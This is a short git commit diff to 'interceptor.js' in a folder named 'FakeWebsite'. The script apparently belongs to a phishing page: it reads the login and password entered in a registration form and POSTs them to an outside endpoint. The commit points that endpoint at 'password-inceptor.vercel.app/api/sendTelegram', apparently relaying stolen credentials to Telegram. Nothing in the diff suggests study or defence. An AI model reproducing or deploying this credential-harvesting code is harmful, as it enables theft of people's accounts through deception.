697cb4bfe335f5e09fe181b94aa62f816ed4b368
DeltaOpenSource <datadccenter@gmail.com>
2025-12-15 04:53:13 +0900

    Update interceptor.js

--- FakeWebsite/interceptor.js
+++ FakeWebsite/interceptor.js
@@ -4,7 +4,7 @@ document.getElementById('registerForm').addEventListener('submit', function(even
     const login = document.getElementById('login').value;
     const password = document.getElementById('password').value;
 
-    const response = await fetch('https://.vercel.app/api/', {
+    const response = await fetch('password-inceptor.vercel.app/api/sendTelegram', {
         method: 'POST',
         headers: {
             'Content-Type': 'application/json'
